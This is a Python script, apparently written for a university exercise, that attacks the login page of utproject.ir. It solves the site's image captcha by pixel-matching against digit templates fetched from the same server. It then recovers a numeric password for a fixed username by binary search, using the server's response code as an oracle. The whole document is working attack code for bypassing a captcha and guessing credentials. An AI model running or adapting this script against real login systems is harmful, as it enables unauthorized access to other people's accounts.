from PIL import Image
from io import BytesIO
import requests
import json
from requests.sessions import Session
ses = Session()

imglist = [ [] for _ in range(10)]
for i in range(10):
    imgReq = requests.get("http://utproject.ir/bp/Numbers/%d.jpg" %i)
    fileimgReq = BytesIO(imgReq.content)
    imgRes = Image.open(fileimgReq)
    imgRes = imgRes.convert("L").load()
    for j in range(40):
        for k in range(40):
            imglist[i].append(imgRes[j,k])

#print(imglist)

def captcha_hack(captcha_list2):
    ri = ses.get("http://utproject.ir/bp/image.php")
    file = BytesIO(ri.content)
    img = Image.open(file)
    arrImg = img.convert("L").load()
    
    captcha_list1 = [ [] for _ in range(5)]
    for i in range(5):
        for j in range(i*40 , (i+1)*40):
            for k in range(40):
                captcha_list1[i].append(arrImg[j,k])
    
    #print(captcha_list1)
    
    captcha_string = ''
    for i in range(5):
        for j in range(10):
            if captcha_list1[i] == imglist[j]:
                captcha_string += str(j)

    return captcha_string

captcha_list2 = []
#print(captcha_hack(captcha_list2))

def password_hack(m,captcha_list2):
    global begin
    global end
    global n
    r=ses.post("http://utproject.ir/bp/login.php",data={"username":"610300032",
        "password":m,"captcha":captcha_hack(captcha_list2)})
    n += 1
    print(n)
    print(captcha_hack(captcha_list2))
    rbyte = r.content.decode()
    rDic = json.loads(rbyte)

    #print(m)
    if rDic["stat"] == 0:
        print(m)
        print('done')
    else:
        if rDic["stat"] == 1:
            end = m
            m = (begin + m) // 2
            print('1')
        elif rDic["stat"] == -1:
            begin = m
            m = (m + end) // 2
            print('2')
        else:
            print('3')
        print(m)
        password_hack(m,captcha_list2)

begin = 0
end = 10 ** 21
n = 0
m = 10 ** 15
password_hack(m,captcha_list2)

